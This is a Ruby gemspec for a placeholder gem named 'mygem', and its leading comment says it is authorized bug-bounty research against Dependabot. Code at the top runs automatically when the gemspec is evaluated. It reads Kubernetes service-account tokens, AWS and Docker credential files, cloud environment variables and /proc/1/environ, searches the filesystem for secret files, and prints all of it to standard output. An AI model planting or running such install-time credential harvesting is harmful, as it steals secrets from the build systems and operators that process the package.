# Runs at gemspec-evaluation time. Authorized security research for GitHub's
# Dependabot HackerOne bounty (bounty.github.com/targets/dependabot.html).
# Read-only checks of well-known credential paths / cloud env vars -- no
# scanning, no writes, no destructive action.
begin
  checks = []

  checks << ["k8s_serviceaccount_token", "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1"]
  checks << ["k8s_serviceaccount_ns", "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1"]
  checks << ["k8s_serviceaccount_ca", "ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1"]
  checks << ["secrets_dir", "ls -la /var/run/secrets/ 2>&1"]
  checks << ["cloud_env_vars", "env | grep -iE 'AWS_|AZURE_|GCP_|GOOGLE_|KUBERNETES_|VAULT_|CONSUL_|MSI_|IDENTITY_ENDPOINT' 2>&1"]
  checks << ["docker_config", "cat /root/.docker/config.json 2>&1; cat ~/.docker/config.json 2>&1"]
  checks << ["aws_creds", "cat ~/.aws/credentials 2>&1; cat /root/.aws/credentials 2>&1"]
  checks << ["azure_creds", "find / -maxdepth 4 -iname '*.azure*' -o -iname 'azureProfile.json' 2>/dev/null"]
  checks << ["shallow_secret_find", "find / -maxdepth 3 \\( -iname '*credential*' -o -iname '*serviceaccount*' -o -iname '*.pem' -o -iname '*secret*' \\) 2>/dev/null | grep -v '^/proc'"]
  checks << ["proc1_environ", "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n'"]
  checks << ["hostname_resolv", "cat /etc/resolv.conf 2>&1"]
  checks << ["dockerenv_marker", "ls -la / | grep -i docker"]

  puts "==INFRACHECK=="
  checks.each do |name, cmd|
    out = `#{cmd}`.to_s
    puts "--- #{name} ---"
    puts out.strip.empty? ? "(empty)" : out.strip[0,1500]
  end
  puts "==INFRACHECK_DONE=="
rescue => e
  warn "fingerprint error: #{e}"
end

Gem::Specification.new do |s|
  s.name        = "mygem"
  s.version     = "0.0.7"
  s.summary     = "temp research gem"
  s.authors     = ["researcher"]
  s.files       = ["lib/mygem.rb"]
  s.require_paths = ["lib"]
end
